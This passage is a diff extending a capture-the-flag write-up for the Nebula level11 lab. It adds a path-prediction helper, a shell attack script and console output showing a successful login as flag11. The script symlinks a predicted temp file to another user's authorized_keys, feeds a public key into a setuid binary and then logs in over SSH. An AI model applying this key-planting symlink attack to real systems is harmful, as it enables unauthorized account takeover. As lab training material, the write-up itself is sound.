@@ -356,6 +356,9 @@ We can generate a key combination and save the `public key` as `.ssh/authorized_
 5. login using `private key` through `SSH`
 
 ### Writing The Exploit
+This badboy will allow us to predict the path.
+
+Notice the ability to tweak the `time_delay` and `pid_delay` as we will execute `flag11` later in our attack script.
 ```c
 #include <stdlib.h>
 #include <sys/types.h>
@@ -394,4 +397,97 @@ int main(int argc, char **argv)
 
     return 0;
 }
+```
+Compile it.
+```console
+level11@nebula:~/exploit$ gcc getpath.c -o getpath
+```
+Now for the attack script.
+
+A little sidenote regarding the comment, it's the last part in the `public key` file and it defaults to `level11@nebula` because we generate the key for the current user.
+
+Throughout my experiments I found that leaving it like that won't allow `SSH` login for `flag11`, so I removed it.
+```shell
+# generate key pair with no comment in public key
+ssh-keygen -t rsa -f key -C ''
+
+# set TEMP to a new tmp directory in home dir
+mkdir -p $HOME/tmp_exploit_dir
+TEMP=$HOME/tmp_exploit_dir
+
+# predict random path and write a symlink in it
+ln -f --symbolic -T /home/flag11/.ssh/authorized_keys $(./getpath 0 5)
+
+# calculate filler for buffer
+FILLER_COUNT=$((1024 - $(wc --bytes < key.pub)))
+
+# generate and pass public key buffer to flag11
+printf "Content-Length: 1024\n$(cat key.pub)\n%s\n" $(python -c "print 'a' * $FILLER_COUNT") | /home/flag11/flag11
+
+# login via ssh w/ private key
+ssh -i key flag11@127.0.0.1
+
+# clean tmp dir
+rm -rf $HOME/tmp_exploit_dir
+```
+This is what we have so far.
+```console
+level11@nebula:~/exploit$ ls -la
+total 16
+drwxrwxr-x 2 level11 level11  100 2021-06-11 10:29 .
+drwxr-x--- 1 level11 level11  180 2021-06-11 10:29 ..
+-rwxrwxrwx 1 level11 level11  656 2021-06-11 10:29 attack.sh
+-rwxrwxrwx 1 level11 level11 7388 2021-06-11 01:58 getpath
+-rw-rw-r-- 1 level11 level11  744 2021-06-11 01:58 getpath.c
+```
+Now run the attack!
+```console
+level11@nebula:~/exploit$ ./attack.sh
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in key.
+Your public key has been saved in key.pub.
+The key fingerprint is:
+02:3f:87:cf:ab:b7:7a:76:fb:f1:fd:4f:18:bf:14:df
+The key's randomart image is:
++--[ RSA 2048]----+
+|                 |
+|                 |
+|    .            |
+|     o .         |
+|      = S     .. |
+|       *       ++|
+|        o   . ..E|
+|        +..  o.o.|
+|      o*oo.o. ..*|
++-----------------+
+blue = 1024, length = 1024, pink = 1024
+sh: $'s\376\347\205Q\241P\301a\376\200': command not found
+
+      _   __     __          __
+     / | / /__  / /_  __  __/ /___ _
+    /  |/ / _ \/ __ \/ / / / / __ `/
+   / /|  /  __/ /_/ / /_/ / / /_/ /
+  /_/ |_/\___/_.___/\__,_/_/\__,_/
+
+    exploit-exercises.com/nebula
+
+
+For level descriptions, please see the above URL.
+
+To log in, use the username of "levelXX" and password "levelXX", where
+XX is the level number.
+
+Currently there are 20 levels (00 - 19).
+
+
+Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+New release '12.04 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+flag11@nebula:~$ getflag
+You have successfully executed getflag on a target account
 ```
